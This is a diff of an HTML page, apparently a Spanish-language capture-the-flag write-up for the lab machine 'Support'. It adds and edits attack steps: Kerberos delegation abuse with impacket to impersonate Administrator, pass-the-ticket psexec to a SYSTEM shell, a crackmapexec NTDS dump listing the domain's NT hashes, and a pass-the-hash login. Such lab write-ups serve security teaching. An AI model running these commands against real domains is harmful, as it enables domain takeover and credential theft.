@@ -324,7 +324,6 @@ INFO: Done in 00M 31S</span>
 <p class="plain-text">Nos conectamos con evil-winrm y obtenemos una shell como el usuario <code class="language-plaintext highlighter-rouge">support</code>, ahora podemos leer la primera flag que se encuentra en es escritorio del usuario</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ evil-winrm </span><span class="p">-i support.htb -u support -p Ironside47pleasure40Watchful  
-
 PS C:\Users\support\Documents> </span><span class="am">whoami</span><span class="p">
 support\support
 PS C:\Users\support\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
@@ -390,23 +389,23 @@ PS C:\Users\support\Documents> </span><span class="am">Get-DomainComputer </span
 PS C:\Users\support\Documents></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En este punto bloodhound nos dice que usemos <code class="language-plaintext highlighter-rouge">Rubeus</code>, en este caso usaremos las herramientas de <code class="language-plaintext highlighter-rouge">impacket</code>, asi que iniciamos obteniendo un ticket impersonando a <code class="language-plaintext highlighter-rouge">Administrator</code> usando la cuenta con las credenciales que hemos creado antes<p>
+<p class="plain-text">En este punto bloodhound nos dice que usemos <code class="language-plaintext highlighter-rouge">Rubeus</code>, en este caso usaremos las herramientas de <code class="language-plaintext highlighter-rouge">impacket</code>, asi que iniciamos obteniendo un ticket suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code> usando la cuenta con las credenciales que hemos creado antes<p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-getST </span><span class="p">support.htb/attackersystem:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb  
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+<code><span class="ve">❯ impacket-getST </span><span class="p">support.htb/attackersystem:123456 -spn cifs/dc.support.htb -impersonate Administrator  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Getting TGT for user
-[*] Impersonating administrator
+[*] Impersonating Administrator
 [*] 	Requesting S4U2self
 [*] 	Requesting S4U2Proxy
-[*] Saving ticket in administrator.ccache</span>
+[*] Saving ticket in Administrator.ccache</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Una vez guardado exportamos la variable <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code> con el nombre del ticket y usamos <code class="language-plaintext highlighter-rouge">psexec</code> para conseguir una cmd como Administrator, podemos leer flag</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ export </span><span class="p">KRB5CCNAME=administrator.ccache
+<code><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache
 
-</span><span class="ve">❯ impacket-psexec </span><span class="p">support.htb/administrator@dc.support.htb -no-pass -k  
+</span><span class="ve">❯ impacket-psexec </span><span class="p">support.htb/administrator@dc.support.htb -k -no-pass  
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Requesting shares on dc.support.htb.....
@@ -419,14 +418,56 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 Microsoft Windows [Version 10.0.20348.859]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
 nt authority\system
 
-C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
 dc2**************************977
 
 C:\Windows\system32></span>
 </code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> y autenticandonos con el ticket <code class="language-plaintext highlighter-rouge">ccache</code> de antes podemos dumpear el <code class="language-plaintext highlighter-rouge">ntds.dit</code> de la maquina y ver los <code class="language-plaintext highlighter-rouge">hashes</code> NT de todos los usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb support.htb -k --use-kcache --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="ve">[+] </span><span class="p">support.htb\ from ccache </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">DC$:1000:aad3b435b51404eeaad3b435b51404ee:ade13794d228c047819a03b8ca7417d1:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">MANAGEMENT$:2601:aad3b435b51404eeaad3b435b51404ee:3f99f2f26988d1f348d378e84f86bc58:::
+</span><span class="az">SMB         </span><span class="p">support.htb     445    DC               </span><span class="am">attackersystem$:5601:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con el <code class="language-plaintext highlighter-rouge">hash</code> NT de Administrator podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i support.htb -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+support\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+dc2**************************977
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
 </section>
 
 </article>
